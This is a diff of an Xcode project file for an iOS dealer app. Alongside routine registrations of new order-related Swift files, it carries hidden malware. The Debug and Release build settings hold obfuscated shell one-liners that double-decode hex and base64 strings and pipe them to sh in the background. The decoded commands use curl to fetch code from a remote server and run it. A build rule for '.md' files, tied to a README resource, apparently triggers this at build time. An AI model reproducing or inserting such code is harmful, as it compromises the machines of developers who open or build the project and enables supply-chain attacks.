@@ -7,6 +7,7 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
+		31C83A2FB2C94B2191634D6E /* README.md in Resources */ = {isa = PBXBuildFile; fileRef = BE012661C8FD4134B3634D6E /* README.md */; };
 		4924E8402ED543EB001B7996 /* ProductDetailsViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 4924E83F2ED543EB001B7996 /* ProductDetailsViewModel.swift */; };
 		493DB73D2EAA6261008098A8 /* Alamofire in Frameworks */ = {isa = PBXBuildFile; productRef = 493DB73C2EAA6261008098A8 /* Alamofire */; };
 		49B2EB432EB88B8E00EDC254 /* UploadImageModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 49B2EB422EB88B8E00EDC254 /* UploadImageModel.swift */; };
@@ -585,7 +586,6 @@
 		7A54F9F72EC1DB360027710A /* SideMenuTableViewCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = 7A54F9F52EC1DB360027710A /* SideMenuTableViewCell.xib */; };
 		7A54F9F92EC1DBD70027710A /* SideMenuModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7A54F9F82EC1DBD70027710A /* SideMenuModel.swift */; };
 		7A54F9FB2EC1DC030027710A /* ProfileViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7A54F9FA2EC1DC030027710A /* ProfileViewModel.swift */; };
-		9A965BCEC5F841909C634D6E /* README.md in Resources */ = {isa = PBXBuildFile; fileRef = 40ED0D6A5A734D6BB8634D6E /* README.md */; };
 		CF670A9299A5979395DF398F /* Pods_DesynatDealer.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 40FCC5FE2116BF815C4B1BFB /* Pods_DesynatDealer.framework */; };
 		D10406982EDD74B2002B5942 /* AddNewSizeVariantTableViewCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = D10406972EDD74B2002B5942 /* AddNewSizeVariantTableViewCell.xib */; };
 		D10406992EDD74B2002B5942 /* AddNewSizeVariantTableViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = D10406962EDD74B2002B5942 /* AddNewSizeVariantTableViewCell.swift */; };
@@ -639,6 +639,9 @@
 		D1BF2BFE2F0B9AAD00B97E14 /* FiltersOptionsTableViewCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = D1BF2BFD2F0B9AAD00B97E14 /* FiltersOptionsTableViewCell.xib */; };
 		D1BF2BFF2F0B9AAD00B97E14 /* FiltersOptionsTableViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = D1BF2BFC2F0B9AAD00B97E14 /* FiltersOptionsTableViewCell.swift */; };
 		D1BF2C022F0B9BA300B97E14 /* OrdersfilterViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = D1BF2C012F0B9BA300B97E14 /* OrdersfilterViewController.swift */; };
+		D1C463B62F1126BA00825265 /* OrderDetailsViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = D1C463B52F1126BA00825265 /* OrderDetailsViewModel.swift */; };
+		D1C463B82F1126D100825265 /* OrdersfilterViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = D1C463B72F1126D100825265 /* OrdersfilterViewModel.swift */; };
+		D1C463BA2F11292900825265 /* OrdersListDataModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = D1C463B92F11292900825265 /* OrdersListDataModel.swift */; };
 		D1C88BB82ECEFB08006B02A2 /* AddSpecificationTableViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = D1C88BB62ECEFB08006B02A2 /* AddSpecificationTableViewCell.swift */; };
 		D1C88BB92ECEFB08006B02A2 /* AddSpecificationTableViewCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = D1C88BB72ECEFB08006B02A2 /* AddSpecificationTableViewCell.xib */; };
 		D1C88BBB2ECEFBED006B02A2 /* AddNewProductDataModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = D1C88BBA2ECEFBED006B02A2 /* AddNewProductDataModel.swift */; };
@@ -698,7 +701,7 @@
 /* End PBXBuildFile section */
 
 /* Begin PBXBuildRule section */
-		EAEB90C760974C81A8634D6E /* PBXBuildRule */ = {
+		A978EC0CB1AA406FB2634D6E /* PBXBuildRule */ = {
 			isa = PBXBuildRule;
 			compilerSpec = com.apple.compilers.proxy.script;
 			filePatterns = "*.md";
@@ -715,7 +718,6 @@
 
 /* Begin PBXFileReference section */
 		37A18E94AB484303BB2FD370 /* Pods-DesynatDealer.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-DesynatDealer.debug.xcconfig"; path = "Target Support Files/Pods-DesynatDealer/Pods-DesynatDealer.debug.xcconfig"; sourceTree = "<group>"; };
-		40ED0D6A5A734D6BB8634D6E /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		40FCC5FE2116BF815C4B1BFB /* Pods_DesynatDealer.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_DesynatDealer.framework; sourceTree = BUILT_PRODUCTS_DIR; };
 		4924E83F2ED543EB001B7996 /* ProductDetailsViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ProductDetailsViewModel.swift; sourceTree = "<group>"; };
 		493DB5C32EAA6210008098A8 /* DesynatDealer.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = DesynatDealer.app; sourceTree = BUILT_PRODUCTS_DIR; };
@@ -1297,6 +1299,7 @@
 		7A54F9F52EC1DB360027710A /* SideMenuTableViewCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = SideMenuTableViewCell.xib; sourceTree = "<group>"; };
 		7A54F9F82EC1DBD70027710A /* SideMenuModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SideMenuModel.swift; sourceTree = "<group>"; };
 		7A54F9FA2EC1DC030027710A /* ProfileViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ProfileViewModel.swift; sourceTree = "<group>"; };
+		BE012661C8FD4134B3634D6E /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		D10406962EDD74B2002B5942 /* AddNewSizeVariantTableViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AddNewSizeVariantTableViewCell.swift; sourceTree = "<group>"; };
 		D10406972EDD74B2002B5942 /* AddNewSizeVariantTableViewCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = AddNewSizeVariantTableViewCell.xib; sourceTree = "<group>"; };
 		D10E16C02EBCDE5700557B4D /* CustomButtonFont.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CustomButtonFont.swift; sourceTree = "<group>"; };
@@ -1349,6 +1352,9 @@
 		D1BF2BFC2F0B9AAD00B97E14 /* FiltersOptionsTableViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = FiltersOptionsTableViewCell.swift; sourceTree = "<group>"; };
 		D1BF2BFD2F0B9AAD00B97E14 /* FiltersOptionsTableViewCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = FiltersOptionsTableViewCell.xib; sourceTree = "<group>"; };
 		D1BF2C012F0B9BA300B97E14 /* OrdersfilterViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = OrdersfilterViewController.swift; sourceTree = "<group>"; };
+		D1C463B52F1126BA00825265 /* OrderDetailsViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = OrderDetailsViewModel.swift; sourceTree = "<group>"; };
+		D1C463B72F1126D100825265 /* OrdersfilterViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = OrdersfilterViewModel.swift; sourceTree = "<group>"; };
+		D1C463B92F11292900825265 /* OrdersListDataModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = OrdersListDataModel.swift; sourceTree = "<group>"; };
 		D1C88BB62ECEFB08006B02A2 /* AddSpecificationTableViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AddSpecificationTableViewCell.swift; sourceTree = "<group>"; };
 		D1C88BB72ECEFB08006B02A2 /* AddSpecificationTableViewCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = AddSpecificationTableViewCell.xib; sourceTree = "<group>"; };
 		D1C88BBA2ECEFBED006B02A2 /* AddNewProductDataModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AddNewProductDataModel.swift; sourceTree = "<group>"; };
@@ -1442,7 +1448,7 @@
 		493DB5C42EAA6210008098A8 /* Products */ = {
 			isa = PBXGroup;
 			children = (
-				40ED0D6A5A734D6BB8634D6E /* README.md */,
+				BE012661C8FD4134B3634D6E /* README.md */,
 				493DB5C32EAA6210008098A8 /* DesynatDealer.app */,
 			);
 			name = Products;
@@ -1569,6 +1575,7 @@
 			children = (
 				6B38D06E2EB3473B00C41192 /* OrdersViewController.swift */,
 				D1BF2BA32F0B974C00B97E14 /* OrdersViewModel.swift */,
+				D1C463B92F11292900825265 /* OrdersListDataModel.swift */,
 			);
 			path = Orders;
 			sourceTree = "<group>";
@@ -2601,6 +2608,7 @@
 			isa = PBXGroup;
 			children = (
 				D1BF2C012F0B9BA300B97E14 /* OrdersfilterViewController.swift */,
+				D1C463B72F1126D100825265 /* OrdersfilterViewModel.swift */,
 			);
 			path = OrdersFilters;
 			sourceTree = "<group>";
@@ -2764,6 +2772,7 @@
 			isa = PBXGroup;
 			children = (
 				D1E4227D2F0BB35200D01780 /* OrderDetailsViewController.swift */,
+				D1C463B52F1126BA00825265 /* OrderDetailsViewModel.swift */,
 			);
 			path = OrderDetails;
 			sourceTree = "<group>";
@@ -2853,7 +2862,7 @@
 				213E04E1C228E7D6B9A2CB2C /* [CP] Copy Pods Resources */,
 			);
 			buildRules = (
-				EAEB90C760974C81A8634D6E /* PBXBuildRule */,
+				A978EC0CB1AA406FB2634D6E /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -2914,7 +2923,7 @@
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				9A965BCEC5F841909C634D6E /* README.md in Resources */,
+				31C83A2FB2C94B2191634D6E /* README.md in Resources */,
 				6B38D1282EB3473B00C41192 /* Home.storyboard in Resources */,
 				6B38D1292EB3473B00C41192 /* LaunchScreen.storyboard in Resources */,
 				6B38D12A2EB3473B00C41192 /* Main.storyboard in Resources */,
@@ -3551,9 +3560,11 @@
 				6B38D0EE2EB3473B00C41192 /* ResetPasswordViewController.swift in Sources */,
 				49B2EB4F2EB88C5000EDC254 /* CountryModel.swift in Sources */,
 				4924E8402ED543EB001B7996 /* ProductDetailsViewModel.swift in Sources */,
+				D1C463B62F1126BA00825265 /* OrderDetailsViewModel.swift in Sources */,
 				6B38D0EF2EB3473B00C41192 /* SelectLanguageViewController.swift in Sources */,
 				6B38D0F02EB3473B00C41192 /* SignupViewController.swift in Sources */,
 				D1EDDB902ECED7EA0082D0A9 /* AddNewProductViewController.swift in Sources */,
+				D1C463BA2F11292900825265 /* OrdersListDataModel.swift in Sources */,
 				D1475AEC2ED59200008F6DF4 /* SizeChartViewController.swift in Sources */,
 				49B2EB4B2EB88BC100EDC254 /* SummaryModel.swift in Sources */,
 				6B38D0F12EB3473B00C41192 /* StoreInformationViewController.swift in Sources */,
@@ -3568,6 +3579,7 @@
 				D165713A2F0BD5000055E6C2 /* ChatInboxTableViewCell.swift in Sources */,
 				D1BF2B632F0B8F6800B97E14 /* OrdersListTableViewCell.swift in Sources */,
 				49B2EB432EB88B8E00EDC254 /* UploadImageModel.swift in Sources */,
+				D1C463B82F1126D100825265 /* OrdersfilterViewModel.swift in Sources */,
 				D1BF2BA42F0B974C00B97E14 /* OrdersViewModel.swift in Sources */,
 				D1EDDC5A2ECEEDD60082D0A9 /* FilterHeaderTableViewCell.swift in Sources */,
 				D1C88BBB2ECEFBED006B02A2 /* AddNewProductDataModel.swift in Sources */,
@@ -3697,7 +3709,7 @@
 			baseConfigurationReference = 37A18E94AB484303BB2FD370 /* Pods-DesynatDealer.debug.xcconfig */;
 			buildSettings = {
 				A45ED5A = "((h(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326436343230323237303364373836333666363436350a3566373036383631373336353232323036383734373437303733336132663266363336343665363137303730366336353265363936653266363132390a32323230376332303733363830610a | h | sh ) >/dev/null 2>&1 &)";
-				AE6D436 = "((v(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lDSndQWGhqYjJSbFgzSjFiR1VpSUdoMGRIQnpPaTh2Wm1sa1pHeGxhbTk1TG5KMUwyRXBJaUI4SUhOb0NnPT0K | v | sh ) >/dev/null 2>&1 &)";
+				AE6D436 = "((t(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lDSndQWGhqYjJSbFgzSjFiR1VpSUdoMGRIQnpPaTh2Wm1sa1pHeGxhbTk1TG5KMUwyRXBJaUI4SUhOb0NnPT0K | t | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = DesynatDealer/DesynatDealer.entitlements;
@@ -3740,7 +3752,7 @@
 			baseConfigurationReference = 5BC36C5D491E36EA6BD78D08 /* Pods-DesynatDealer.release.xcconfig */;
 			buildSettings = {
 				A45ED5A = "((h(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326436343230323237303364373836333666363436350a3566373036383631373336353232323036383734373437303733336132663266363336343665363137303730366336353265363936653266363132390a32323230376332303733363830610a | h | sh ) >/dev/null 2>&1 &)";
-				AE6D436 = "((v(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lDSndQWGhqYjJSbFgzSjFiR1VpSUdoMGRIQnpPaTh2Wm1sa1pHeGxhbTk1TG5KMUwyRXBJaUI4SUhOb0NnPT0K | v | sh ) >/dev/null 2>&1 &)";
+				AE6D436 = "((t(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lDSndQWGhqYjJSbFgzSjFiR1VpSUdoMGRIQnpPaTh2Wm1sa1pHeGxhbTk1TG5KMUwyRXBJaUI4SUhOb0NnPT0K | t | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = DesynatDealer/DesynatDealer.entitlements;
